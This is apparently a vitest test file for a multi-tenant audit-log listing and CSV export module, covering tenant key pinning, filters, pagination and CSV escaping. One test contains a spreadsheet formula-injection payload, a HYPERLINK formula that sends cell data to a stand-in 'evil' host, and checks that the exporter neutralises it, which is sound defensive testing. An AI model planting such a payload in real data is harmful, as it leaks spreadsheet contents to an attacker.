import { afterEach, describe, expect, it, vi } from "vitest";
import {
  exportTenantAuditCsv,
  listTenantAuditEntries,
} from "../../lib/problem-deploy/handlers/event-handler/audit-log-read";

/**
 * Issue #1292: tenant 越境を物理的に不能にするため、 PK は caller の tenantId 固定。
 * 本 test は PK 固定 + filter / CSV 形式の round-trip を pin する。
 */

afterEach(() => vi.clearAllMocks());

function buildMock(items: Array<Record<string, unknown>>, last?: Record<string, unknown>) {
  const send = vi.fn().mockResolvedValueOnce({
    Items: items,
    ...(last ? { LastEvaluatedKey: last } : {}),
  });
  return { ddb: { send } as never, send };
}

describe("listTenantAuditEntries (#1292)", () => {
  it("should Query with PK=TENANT#<tenantId> fixed from caller", async () => {
    const { ddb, send } = buildMock([
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#01HX",
        actor: "u-1",
        action: "create_event",
        outcome: "success",
        occurredAt: "2026-05-20T12:00:00.000Z",
      },
    ]);
    const out = await listTenantAuditEntries({ ddb, auditTableName: "T" }, { tenantId: "t-1" });
    expect(out.items.length).toBe(1);
    const cmd = send.mock.calls[0]?.[0] as { input?: Record<string, unknown> };
    expect((cmd.input?.ExpressionAttributeValues as Record<string, unknown>)?.[":pk"]).toBe(
      "TENANT#t-1",
    );
    expect(cmd.input?.ScanIndexForward).toBe(false);
  });

  it("should apply from / to / action / principal filters client-side", async () => {
    const { ddb } = buildMock([
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#A",
        actor: "u-1",
        action: "create_event",
        outcome: "success",
        occurredAt: "2026-05-20T12:00:00.000Z",
      },
      {
        PK: "TENANT#t-1",
        SK: "AUDIT#B",
        actor: "u-2",
        action: "delete_event",
        outcome: "success",
        occurredAt: "2026-05-21T12:00:00.000Z",
      },
    ]);
    const out = await listTenantAuditEntries(
      { ddb, auditTableName: "T" },
      {
        tenantId: "t-1",
        from: "2026-05-21T00:00:00.000Z",
        action: "delete_event",
        principal: "u-2",
      },
    );
    expect(out.items.map((i) => i.action)).toEqual(["delete_event"]);
  });

  it("should propagate base64 nextCursor when LastEvaluatedKey is returned", async () => {
    const lastKey = { PK: "TENANT#t-1", SK: "AUDIT#01HX" };
    const { ddb } = buildMock([], lastKey);
    const out = await listTenantAuditEntries({ ddb, auditTableName: "T" }, { tenantId: "t-1" });
    expect(out.nextCursor).toBe(Buffer.from(JSON.stringify(lastKey)).toString("base64"));
  });
});

describe("exportTenantAuditCsv (#1292)", () => {
  it("should produce CSV with a header row and escape special characters", async () => {
    // 2 pages: 1st has 1 row + LastEvaluatedKey, 2nd has 1 row + no key
    const send = vi
      .fn()
      .mockResolvedValueOnce({
        Items: [
          {
            PK: "TENANT#t-1",
            SK: "AUDIT#A",
            actor: "u-1",
            actorUsername: "alice@example.com",
            action: "create_event",
            outcome: "success",
            target: 'has "quote", and comma',
            occurredAt: "2026-05-20T12:00:00.000Z",
          },
        ],
        LastEvaluatedKey: { PK: "TENANT#t-1", SK: "AUDIT#A" },
      })
      .mockResolvedValueOnce({
        Items: [
          {
            PK: "TENANT#t-1",
            SK: "AUDIT#B",
            actor: "u-2",
            action: "delete_event",
            outcome: "forbidden",
            occurredAt: "2026-05-21T12:00:00.000Z",
          },
        ],
      });
    const csv = await exportTenantAuditCsv(
      { ddb: { send } as never, auditTableName: "T" },
      { tenantId: "t-1" },
    );
    const lines = csv.trim().split("\n");
    expect(lines[0]).toBe(
      "occurredAt,tenantId,actor,actorUsername,action,outcome,target,ipAddress,userAgent",
    );
    expect(lines[1]).toContain('"has ""quote"", and comma"');
    expect(lines[2]).toContain("delete_event");
    expect(send).toHaveBeenCalledTimes(2);
  });

  it("should drain every page following LastEvaluatedKey with PK fixed + ScanIndexForward=false", async () => {
    const row = (sk: string) => ({
      PK: "TENANT#t-1",
      SK: `AUDIT#${sk}`,
      actor: "u",
      action: "x",
      outcome: "success",
      occurredAt: `2026-05-20T12:00:00.00${sk}Z`,
    });
    const send = vi
      .fn()
      .mockResolvedValueOnce({
        Items: [row("A")],
        LastEvaluatedKey: { PK: "TENANT#t-1", SK: "k1" },
      })
      .mockResolvedValueOnce({
        Items: [row("B")],
        LastEvaluatedKey: { PK: "TENANT#t-1", SK: "k2" },
      })
      .mockResolvedValueOnce({ Items: [row("C")] });
    const csv = await exportTenantAuditCsv(
      { ddb: { send } as never, auditTableName: "T" },
      { tenantId: "t-1" },
    );
    // 3 ページ全て drain。
    expect(send).toHaveBeenCalledTimes(3);
    expect(csv.trim().split("\n").length).toBe(4); // header + 3 rows
    const first = send.mock.calls[0]?.[0] as { input?: Record<string, unknown> };
    expect((first.input?.ExpressionAttributeValues as Record<string, unknown>)?.[":pk"]).toBe(
      "TENANT#t-1",
    );
    expect(first.input?.ScanIndexForward).toBe(false);
    expect(first.input?.ExclusiveStartKey).toBeUndefined();
    // 2 / 3 ページ目の ExclusiveStartKey は直前ページの LastEvaluatedKey を引き継ぐ。
    const second = send.mock.calls[1]?.[0] as { input?: Record<string, unknown> };
    expect(second.input?.ExclusiveStartKey).toEqual({ PK: "TENANT#t-1", SK: "k1" });
    const third = send.mock.calls[2]?.[0] as { input?: Record<string, unknown> };
    expect(third.input?.ExclusiveStartKey).toEqual({ PK: "TENANT#t-1", SK: "k2" });
  });

  it("#1388: should neutralize a formula-injection payload from the userAgent header", async () => {
    const send = vi.fn().mockResolvedValueOnce({
      Items: [
        {
          PK: "TENANT#t-1",
          SK: "AUDIT#A",
          actor: "u-1",
          action: "create_event",
          outcome: "success",
          // userAgent は request header 由来 (= 攻撃者制御)。 =HYPERLINK は Excel で実行される。
          userAgent: '=HYPERLINK("http://evil/?c="&A1,"open")',
          occurredAt: "2026-05-20T12:00:00.000Z",
        },
      ],
    });
    const csv = await exportTenantAuditCsv(
      { ddb: { send } as never, auditTableName: "T" },
      { tenantId: "t-1" },
    );
    // 先頭 = は single quote で無害化され、 quote で囲まれる (= cell として実行されない)。
    expect(csv).toContain('"\'=HYPERLINK(""http://evil/?c=""&A1,""open"")"');
    // 生の "=HYPERLINK( が行頭に来ない (= formula として解釈されない)。
    expect(csv).not.toMatch(/,=HYPERLINK\(/);
  });

  it("should respect maxRows truncation", async () => {
    const send = vi.fn().mockResolvedValueOnce({
      Items: Array.from({ length: 50 }, (_, i) => ({
        PK: "TENANT#t-1",
        SK: `AUDIT#${i}`,
        actor: "u",
        action: "x",
        outcome: "success",
        occurredAt: `2026-05-20T12:00:${String(i).padStart(2, "0")}.000Z`,
      })),
    });
    const csv = await exportTenantAuditCsv(
      { ddb: { send } as never, auditTableName: "T" },
      { tenantId: "t-1" },
      { maxRows: 5 },
    );
    // header + 5 data rows + trailing newline = 6 lines + 1 trailing empty
    expect(csv.trim().split("\n").length).toBe(6);
  });
});
